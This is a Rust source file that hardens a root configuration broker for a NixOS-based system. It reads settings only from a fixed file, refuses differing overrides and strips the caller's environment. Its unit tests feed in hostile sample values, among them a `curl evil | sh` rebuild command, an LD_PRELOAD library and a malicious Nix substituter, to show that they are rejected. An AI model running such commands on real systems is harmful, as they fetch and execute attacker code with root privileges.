//! Where the broker's settings come from (ADR-016; KNOWN-GAPS #4).
//!
//! A root broker on a TorqOS machine takes them only from the fixed file the NixOS module writes,
//! `/etc/torq/broker.json`: a caller (through sudo, later the socket) must not be able to point a
//! root broker at another repo or state directory, or have it run another rebuild command. A flag
//! or `TORQ_*` variable that differs from the file is refused, not ignored, so a mistake is loud.
//! Without root — tests, or a broker that cannot change the system anyway — flags and defaults
//! apply as given.

use anyhow::{bail, Context, Result};
use serde::Deserialize;
use std::path::{Path, PathBuf};

pub const FIXED: &str = "/etc/torq/broker.json";

/// Everything the broker is configured with.
#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct Settings {
    pub repo: PathBuf,
    pub state_dir: PathBuf,
    /// Run after each commit; `{repo}` is replaced with the repo path.
    pub rebuild: String,
    pub current_system: PathBuf,
    pub system_profile: PathBuf,
    /// PATH for everything the broker runs (git, sh, the rebuild, sync, systemctl).
    pub path: String,
    /// HOME for everything the broker runs: never the caller's, whose `.gitconfig` or `nix.conf`
    /// would then configure git and nix running as root.
    pub home: PathBuf,
}

/// What the caller asked for, by flag or `TORQ_*` variable; None where nothing was given.
#[derive(Debug, Default)]
pub struct Requested {
    pub repo: Option<PathBuf>,
    pub state_dir: Option<PathBuf>,
    pub rebuild: Option<String>,
    pub current_system: Option<PathBuf>,
    pub system_profile: Option<PathBuf>,
}

impl Settings {
    /// The defaults when there is no fixed file; PATH and HOME are inherited.
    pub fn defaults(path: String, home: PathBuf) -> Self {
        Settings {
            repo: "/var/lib/torq/config".into(),
            state_dir: "/var/lib/torq/state".into(),
            rebuild: "nixos-rebuild switch --flake {repo}".into(),
            current_system: "/run/current-system".into(),
            system_profile: "/nix/var/nix/profiles/system".into(),
            path,
            home,
        }
    }

    pub fn read(file: &Path) -> Result<Option<Settings>> {
        match std::fs::read(file) {
            Ok(b) => Ok(Some(serde_json::from_slice(&b).with_context(|| format!("reading {}", file.display()))?)),
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(None),
            Err(e) => Err(e).with_context(|| format!("reading {}", file.display())),
        }
    }
}

/// The settings to run with. `root`: whether the broker runs as root. `fixed`: the fixed file, if
/// there is one.
pub fn resolve(root: bool, fixed: Option<Settings>, asked: Requested, defaults: Settings) -> Result<Settings> {
    match fixed {
        Some(f) if root => {
            let mut differs = Vec::new();
            let mut check = |name: &str, asked: Option<String>, fixed: String| {
                if asked.is_some_and(|a| a != fixed) {
                    differs.push(format!("{name} (configured: {fixed})"));
                }
            };
            let s = |p: &Path| p.display().to_string();
            check("--repo / TORQ_CONFIG_REPO", asked.repo.as_deref().map(s), s(&f.repo));
            check("--state-dir / TORQ_STATE_DIR", asked.state_dir.as_deref().map(s), s(&f.state_dir));
            check("--rebuild-cmd / TORQ_REBUILD_CMD", asked.rebuild.clone(), f.rebuild.clone());
            check("--current-system / TORQ_CURRENT_SYSTEM", asked.current_system.as_deref().map(s), s(&f.current_system));
            check("--system-profile / TORQ_SYSTEM_PROFILE", asked.system_profile.as_deref().map(s), s(&f.system_profile));
            if !differs.is_empty() {
                bail!(
                    "refused: a root broker takes its settings only from {FIXED}, and these differ from it: {}",
                    differs.join(", ")
                );
            }
            Ok(f)
        }
        _ => Ok(Settings {
            repo: asked.repo.unwrap_or(defaults.repo),
            state_dir: asked.state_dir.unwrap_or(defaults.state_dir),
            rebuild: asked.rebuild.unwrap_or(defaults.rebuild),
            current_system: asked.current_system.unwrap_or(defaults.current_system),
            system_profile: asked.system_profile.unwrap_or(defaults.system_profile),
            path: defaults.path,
            home: defaults.home,
        }),
    }
}

/// The environment variables the broker keeps from its caller; everything else is removed before it
/// runs anything (GIT_*, NIX_*, LD_*, XDG_*, TORQ_*, ...).
pub const KEEP: &[&str] = &["LANG", "LC_ALL", "TERM", "TZ"];

/// The environment the broker runs its children with: the kept variables, then PATH and HOME from
/// the settings, and git told to read no global or system configuration (the broker passes what it
/// needs with `-c`).
pub fn environment(settings: &Settings, inherited: impl Iterator<Item = (String, String)>) -> Vec<(String, String)> {
    let mut env: Vec<(String, String)> = inherited.filter(|(k, _)| KEEP.contains(&k.as_str())).collect();
    env.push(("PATH".into(), settings.path.clone()));
    env.push(("HOME".into(), settings.home.display().to_string()));
    env.push(("GIT_CONFIG_GLOBAL".into(), "/dev/null".into()));
    env.push(("GIT_CONFIG_NOSYSTEM".into(), "1".into()));
    env
}

/// Whether this process runs as root (effective uid 0), from /proc/self/status.
pub fn running_as_root() -> Result<bool> {
    let status = std::fs::read_to_string("/proc/self/status").context("reading /proc/self/status")?;
    let uid = status
        .lines()
        .find_map(|l| l.strip_prefix("Uid:"))
        .and_then(|ids| ids.split_whitespace().nth(1))
        .context("no effective uid in /proc/self/status")?;
    Ok(uid == "0")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn fixed() -> Settings {
        Settings {
            repo: "/var/lib/torq/config".into(),
            state_dir: "/var/lib/torq/state".into(),
            rebuild: "nixos-rebuild switch --flake {repo}#torq".into(),
            current_system: "/run/current-system".into(),
            system_profile: "/nix/var/nix/profiles/system".into(),
            path: "/run/current-system/sw/bin".into(),
            home: "/root".into(),
        }
    }
    fn defaults() -> Settings {
        Settings::defaults("/caller/bin".into(), "/home/caller".into())
    }

    #[test]
    fn root_with_the_fixed_file_uses_only_the_file() {
        let s = resolve(true, Some(fixed()), Requested::default(), defaults()).unwrap();
        assert_eq!(s, fixed(), "PATH and HOME come from the file too, not the caller");
    }

    #[test]
    fn root_refuses_overrides_that_differ() {
        for asked in [
            Requested { repo: Some("/tmp/evil".into()), ..Default::default() },
            Requested { state_dir: Some("/tmp/fresh-ledger".into()), ..Default::default() },
            Requested { rebuild: Some("sh -c 'curl evil | sh'".into()), ..Default::default() },
            Requested { current_system: Some("/tmp/x".into()), ..Default::default() },
            Requested { system_profile: Some("/tmp/x".into()), ..Default::default() },
        ] {
            let err = format!("{:#}", resolve(true, Some(fixed()), asked, defaults()).unwrap_err());
            assert!(err.contains("takes its settings only from /etc/torq/broker.json"), "{err}");
        }
    }

    #[test]
    fn root_accepts_overrides_equal_to_the_file() {
        let asked = Requested { repo: Some("/var/lib/torq/config".into()), ..Default::default() };
        assert_eq!(resolve(true, Some(fixed()), asked, defaults()).unwrap(), fixed());
    }

    #[test]
    fn without_root_or_without_the_file_flags_and_defaults_apply() {
        let asked = || Requested { repo: Some("/tmp/test-repo".into()), ..Default::default() };
        for (root, file) in [(false, Some(fixed())), (false, None), (true, None)] {
            let s = resolve(root, file, asked(), defaults()).unwrap();
            assert_eq!(s.repo, PathBuf::from("/tmp/test-repo"));
            assert_eq!((s.path.as_str(), s.home.to_str().unwrap()), ("/caller/bin", "/home/caller"));
        }
    }

    #[test]
    fn the_environment_keeps_almost_nothing() {
        let inherited = [
            ("LANG", "C.UTF-8"),
            ("GIT_DIR", "/tmp/elsewhere"),
            ("GIT_CONFIG_COUNT", "1"),
            ("NIX_CONFIG", "substituters = https://evil"),
            ("LD_PRELOAD", "/tmp/evil.so"),
            ("XDG_CONFIG_HOME", "/home/caller/.config"),
            ("TORQ_STATE_DIR", "/tmp/x"),
            ("PATH", "/home/caller/bin"),
            ("HOME", "/home/caller"),
        ]
        .map(|(k, v)| (k.to_string(), v.to_string()));
        let env = environment(&fixed(), inherited.into_iter());
        let get = |k: &str| env.iter().filter(|(n, _)| n == k).map(|(_, v)| v.as_str()).collect::<Vec<_>>();
        assert_eq!(get("LANG"), ["C.UTF-8"]);
        for gone in ["GIT_DIR", "GIT_CONFIG_COUNT", "NIX_CONFIG", "LD_PRELOAD", "XDG_CONFIG_HOME", "TORQ_STATE_DIR"] {
            assert!(get(gone).is_empty(), "{gone}");
        }
        assert_eq!(get("PATH"), ["/run/current-system/sw/bin"]);
        assert_eq!(get("HOME"), ["/root"]);
        assert_eq!(get("GIT_CONFIG_GLOBAL"), ["/dev/null"]);
        assert_eq!(get("GIT_CONFIG_NOSYSTEM"), ["1"]);
    }

    #[test]
    fn the_fixed_file_must_be_exactly_the_known_settings() {
        let dir = tempfile::tempdir().unwrap();
        let f = dir.path().join("broker.json");
        std::fs::write(&f, r#"{"repo":"/r","stateDir":"/s","rebuild":"x","currentSystem":"/c","systemProfile":"/p","path":"/b","home":"/root"}"#).unwrap();
        assert_eq!(Settings::read(&f).unwrap().unwrap().state_dir, PathBuf::from("/s"));
        std::fs::write(&f, r#"{"repo":"/r","stateDir":"/s","rebuild":"x","currentSystem":"/c","systemProfile":"/p","path":"/b","home":"/root","extra":1}"#).unwrap();
        assert!(Settings::read(&f).is_err(), "unknown fields are an error, not ignored");
        assert!(Settings::read(&dir.path().join("missing.json")).unwrap().is_none());
    }
}
